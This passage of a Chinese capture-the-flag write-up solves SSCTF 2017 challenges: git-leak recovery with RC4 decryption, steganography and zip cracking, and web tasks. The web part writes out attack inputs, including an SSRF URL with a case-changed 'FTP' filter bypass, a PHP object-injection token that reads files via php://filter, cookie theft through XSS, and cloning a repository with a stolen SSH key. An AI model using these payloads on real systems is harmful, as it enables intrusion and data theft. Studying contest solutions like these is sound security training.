通过GitHack把文件下载下来后继续分析：



```
root@kali:~/Desktop/GitHack/dist/60.191.205.87# git log
commit 6a0bbb4f6ce6d101c0cf5abac4b04ff004b1a918
Author: zhang tie &lt;zt@163.com&gt;
Date:   Wed Apr 26 06:10:14 2017 -0400
    this is flag
commit 8894bb4d45643d52b5eb8175710999fcd398ebd4
Author: zhang tie &lt;zt@163.com&gt;
Date:   Wed Apr 26 06:08:12 2017 -0400
    666666666
commit 473e9cce7391e913ffcf10b96ba6e4c0b950fe8e
Author: zhang tie &lt;zt@163.com&gt;
Date:   Wed Apr 26 06:05:28 2017 -0400
    test pass
commit 9ab1451776fb32e82c2524fc4f37fa3f33ceae2f
Author: zhang tie &lt;zt@163.com&gt;
Date:   Wed Apr 26 05:46:06 2017 -0400
    password?
commit eac8d383f192730a605bb5d3115aa4bbba8a99ea
Author: zhang tie &lt;zt@163.com&gt;
Date:   Wed Apr 26 05:32:31 2017 -0400
    pass??
commit cd7bee8ad1b5807b7136fd8fb0c9ae853204c1fc
Author: zhang tie &lt;zt@163.com&gt;
Date:   Wed Apr 26 05:29:33 2017 -0400
    pass????
```

在 8894bb4d45643d52b5eb8175710999fcd398ebd4 下看到了



```
root@kali:~/Desktop/GitHack/dist/60.191.205.87# git show 8894bb4d45643d52b5eb8175710999fcd398ebd4
warning: refname '8894bb4d45643d52b5eb8175710999fcd398ebd4' is ambiguous.
```

Git 通常不会创建一个以40位十六进制字符命名的引用，因为当你提供40位

十六进制字符时将被忽略。不过这些引用也可能被错误地创建。例如：

```
git checkout -b $br $(git rev-parse ...)
```

当 "$br" 空白时一个40位十六进制的引用将被创建。请检查这些引用，

可能需要删除它们。用 "git config advice.objectNameWarning false"

命令关闭本消息通知。



```
commit 8894bb4d45643d52b5eb8175710999fcd398ebd4
Author: zhang tie &lt;zt@163.com&gt;
Date:   Wed Apr 26 06:08:12 2017 -0400
    666666666
diff --git a/ssctf/phpcms/templates/flag.txt b/ssctf/phpcms/templates/flag.txt
new file mode 100644
index 0000000..7746a53
--- /dev/null
+++ b/ssctf/phpcms/templates/flag.txt
@@ -0,0 +1 @@
+SSCTF`{`xsL3HOvFlV+H40s0mhszc5t1x38EU0ZIFJHZ/h2sC3U=`}`
SSCTF`{`xsL3HOvFlV+H40s0mhszc5t1x38EU0ZIFJHZ/h2sC3U=`}`
```

但是 这是被加密了的字符串

继续往下看，在



```
root@kali:~/Desktop/GitHack/dist/60.191.205.87# git show 9ab1451776fb32e82c2524fc4f37fa3f33ceae2f
commit 9ab1451776fb32e82c2524fc4f37fa3f33ceae2f
Author: zhang tie &lt;zt@163.com&gt;
Date:   Wed Apr 26 05:46:06 2017 -0400
    password?
diff --git a/ssctf/pass.php b/ssctf/pass.php
index 23fdea9..f0acac5 100644
--- a/ssctf/pass.php
+++ b/ssctf/pass.php
@@ -1 +1,30 @@
-this is pass?
+&lt;?php
+$encrypt = base64_encode(wtf('flag_password', 'ssctf'));
+function wtf($data,$pwd) `{`
+    $cipher ="";
+    $key[] ="";
+    $box[] ="";
+    $pwd_length = strlen($pwd);
+    $data_length = strlen($data);
+    for ($i = 0; $i &lt; 256; $i++) `{`
+        $key[$i] = ord($pwd[$i % $pwd_length]);
+        $box[$i] = $i;
+    `}`
+    for ($j = $i = 0; $i &lt; 256; $i++) `{`
+        $j = ($j + $box[$i] + $key[$i]) % 256;
+        $tmp = $box[$i];
+        $box[$i] = $box[$j];
+        $box[$j] = $tmp;
+    `}`
+    for ($a = $j = $i = 0; $i &lt; $data_length; $i++) `{`
+        $a = ($a + 1) % 256;
+        $j = ($j + $box[$a]) % 256;
+        $tmp = $box[$a];
+        $box[$a] = $box[$j];
+        $box[$j] = $tmp;
+        $k = $box[(($box[$a] + $box[$j]) % 256)];
+        $cipher .= chr(ord($data[$i]) ^ $k);
+    `}`
+    return $cipher;
+`}`
+?&gt;
```

找到了加密方法 通过分析，我们知道这是 RC4加密，那么我只需要对密文重新一次加密便能得到明文

所以修改下php，重新加密后，我们得到flag f6daf9bf00e45f52f23d844f20952503

**Misc150 互相伤害！！！**

解压出来是个流量包，

[![](https://p1.ssl.qhimg.com/t01e015f0c516544e6b.png)](https://p1.ssl.qhimg.com/t01e015f0c516544e6b.png)

从流量包中可以导出一堆图片 一堆图片 不对 是一堆表情包

通过这张图片的二维码 扫到信息一 U2FsdGVkX1+VpmdLwwhbyNU80MDlK+8t61sewce2qCVztitDMKpQ4fUl5nsAZOI7 bE9uL8lW/KLfbs33aC1XXw==

从图中的 CTF 以及 AES 等信息推测，这是一个AES加密后的密文，密钥极有可能是 CTF

[http://tool.oschina.net/encrypt](http://tool.oschina.net/encrypt) 通过在线解除一串字符串:668b13e0b0fc0944daf4c223b9831e49。但这并不是flag

通过对所以图片 binwalk解析，

```
binwalk *.jpg -e
```

在第11张图片中看到一个压缩包，尝试用上述解出来的字符串解压

得到一张二维码中间还有一个二维码的图片，反色扫描得到flag

**Misc200 我们的秘密是绿色的**

这是一个图片隐写 需要运用到 OurSecret这个隐写工具

通过题目信息，key是图中绿色的文字 0405111218192526 得到一个 名字为 try的压缩包 

压缩包密码提示： 你知道coffee的生日是多少么~~~

通过字典爆破得到密码是： 19950822

之后进入下一层 通过明文攻击得到

Advanced Archive Password Recovery 统计信息:

加密的 ZIP/RAR/ACE/ARJ 文件: C:UserswingsDesktopflag.zip

总计口令: n/a

总计时间: 4m 11s 358ms 

平均速度(口令/秒): n/a

这个文件的口令 : Y29mZmVl

十六进制口令: 59 32 39 6d 5a 6d 56 6c 

得到密文Y29mZmVl 

进入下一层伪加密，改加密位后

[![](https://p0.ssl.qhimg.com/t015bdb0814405d827b.png)](https://p0.ssl.qhimg.com/t015bdb0814405d827b.png)

得到 qddpqwnpcplen%prqwn_`{`_zz*d@gq`}` 分别解栅栏 凯撒后得到 flag`{`ssctf_@seclover%coffee_*`}`

**Misc300 你知道我在等你么**

对 你知道我在等你吗.mp3 binwalk 处理。得到三个文件，一个提示，一个压缩包，一个MP3 

对 mp3文件 strings *.mp3 后 得到 falg_config_@tl_ 这是压缩包密码，从压缩包中解压出一张 咖啡(coffee)图片。

[![](https://p1.ssl.qhimg.com/t015fbfb998dbba2ed0.png)](https://p1.ssl.qhimg.com/t015fbfb998dbba2ed0.png)

在图片中发现 coffee字样，以及IHDR 猜测后面是一张png图片，从coffee开始把数据dump下来，并保存为png图片，修改png头。得到张二维码，扫描二维码是一个下载链接，

下载下来是txt 文件，但是在内容中看到了PK字样，改为 zip后缀。

然后又是一个伪加密….

得到 a2V5aXMlN0JzZWMxb3ZlciUyNV82dWdzY2FuX0Bjb2ZmZWUlN0Q=

解base64得到 'keyis%7Bsec1over%25_6ugscan_@coffee%7D'

flag是 keyis`{`sec1over%6ugscan@coffee`}`

<br>

**Web渗透**

**Web100 捡吗？**

题目考的是ssrf，一开始扫描很浪费时间，而且导致服务器几乎崩溃，后来给了hint，然后利用大小写把ftp换成FTP绕过，拿到flag。



```
http://120.132.21.19/news.php?url=10.23.173.190/news.php?url=FTP://172.17.0.2/flag.txt
ssctf`{`85c43ae2851ba3142364b65d3f1e360f`}`
```

**Web200 弹幕**

先分析题目，利用websocket在网页中显示弹幕，发现一个特殊的welcome弹幕是一个xss平台payload，然后得到xss平台地址http://117.34.71.7/xssHentai admin:admin登录，cookie中提示uid为1拿到flag，而admin用户uid不是1。然后发现xss平台接收xss时有xss漏洞。然后http://117.34.71.7/xssHentai/request/1/?body=YOUR XSS PAYLOAD，然后收到cookie即flag。

**Web300 白吗?全是套路**

看上去有各种信息，但是很多信息都不真实，网站压缩包也没爆破出密码。最后通过web1点ssrf利用file协议读取到源码。

submit.php



```
&lt;?php
header("CONTENT-TYPE:text/html;charset=UTF-8");
define("HOST","127.0.0.1");
define("USERNAME","root");
define("PASSWORD","");
$con=new mysqli(HOST,USERNAME,PASSWORD,"ctf1");
if(!$con)`{`
    echo $con-&gt;error;
    exit("aaaa");
`}`
if(!$con-&gt;select_db("ctf1"))`{`
    echo $con-&gt;error;
`}`
if(!$con-&gt;query("SET NAMES utf8"))`{`
    echo $con-&gt;error;
`}`
$xss=$_POST["sub"];
$str = addslashes($xss);
/**********鑾峰彇IP************/
class Action  
`{`  
    function get_outer()  
    `{`  
        $url = 'http://www.ip138.com/ip2city.asp';  
        $info = file_get_contents($url);  
        preg_match('|&lt;center&gt;(.*?)&lt;/center&gt;|i', $info, $m);  
        return $m[1];  
    `}`  
    function get_inter()  
    `{`  
        $onlineip = '';  
        if (getenv('HTTP_CLIENT_IP') &amp;&amp; strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) `{`  
            $onlineip = getenv('HTTP_CLIENT_IP');  
        `}` elseif (getenv('HTTP_X_FORWARDED_FOR') &amp;&amp; strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) `{`  
            $onlineip = getenv('HTTP_X_FORWARDED_FOR');  
        `}` elseif (getenv('REMOTE_ADDR') &amp;&amp; strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) `{`  
            $onlineip = getenv('REMOTE_ADDR');  
        `}` elseif (isset($_SERVER['REMOTE_ADDR']) &amp;&amp; $_SERVER['REMOTE_ADDR'] &amp;&amp; strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) `{`  
            $onlineip = $_SERVER['REMOTE_ADDR'];  
        `}`  
        return $onlineip;  
    `}`  
`}`  
$p = new Action();
$intip = $p-&gt;get_inter();
$outip2= $intip;
@mkdir("/tmp/ids",0777,true);
$sql="insert into ctf1(xss,ip,time,wai_ip) values('$str','$intip',NOW(),'$outip2')";
if($str=$con-&gt;query($sql))`{`
    echo "&lt;script&gt;alert('success');window.location.href='index.php'&lt;/script&gt;";
    $insertid = mysqli_insert_id($con);
    file_put_contents("/tmp/ids/".$insertid,"a");
`}`
else `{`
    echo "&lt;script&gt;alert('fail');&lt;/script&gt;";
`}`
?&gt;
```

发现直接post提交参数sub为xss payload即可。然后得到referer打开，查看源码发现script标签引用了/admin/js.php

然后直接读取js.php即可拿到flag

view-source:http://120.132.21.19/news.php?url=10.23.173.190/news.php?url=127.0.0.1/admin/js.php



```
&lt;script&gt;function get_flag()
`{`
return "ssctf`{`dedbd1b010b16bc4fd0f1193d631cd9f`}`";
`}`&lt;/script&gt;
```

**Web500 WebHook**

题目设计问题导致出现很多非预期，这些就不提了，给一个正确的思路。

首先题目给了github项目，里面有服务器地址。然后审计python源码，有一个内置的KEY上线时被修改，然后大概试了一下，是ssctf。有了KEY就能添加一个github或者coding上的项目，然后每次调用push接口，会从项目得到源码，并把build.json中的文件夹或文件压缩放到outfile目录。然后用户用repo名字和添加repo时设置的密码登录即可下载到这个压缩文件。

这个时候就能读取任意文件或文件夹了。然后下载flag项目，发现里面并没有flag。很久之后在/home/www-data/.ssh/目录下找到私钥，然后读取repos.json拿到flag项目地址。自己利用ssh私钥git clone一下或者在下载到的flag目录git pull一下，就能得到flag.txt



```
ssh -T git@git.coding.net -i id_rsa
git clone git@git.coding.net:ljgame/flag.git
cat flag.txt
SSCTF`{`02d6d06ec9e35d11d1f421a400edbb06`}`
```

Web500 CloverSec Logos

在显示图片处找到注入，参数由双引号包裹，经过简单的字符串替换。直接布尔盲注即可，information_schema库好像是由于权限问题跑不出来数据，然后手动猜测了一下（后来放出了hint），表名user，字段名username,password。跑出来密码20位，然后去掉前三后一，cmd5解密是admin^g。成功登陆，然后题目提示vim。访问index.php.swp看到源码，需要使得file_get_contents($_GET[secret])===‘1234’ 然后让secret=php://input，post数据为1234即可。

然后读取include.php.swp

这里有一个过滤，利用+就不会正则匹配到数字。把cookie中token参数设置为

```
O:+4:”Read":1:`{`s:4:"file";s:63:"php://filter/read=convert.base64-encode/resource=ssctf_flag.php";`}`
```

即可读取flag文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ba9701e7600da7aa.png)

**<br>**

**传送门**

[**第三届 SSCTF 全国网络安全大赛—线上赛圆满结束！**](http://bobao.360.cn/ctf/activity/421.html)


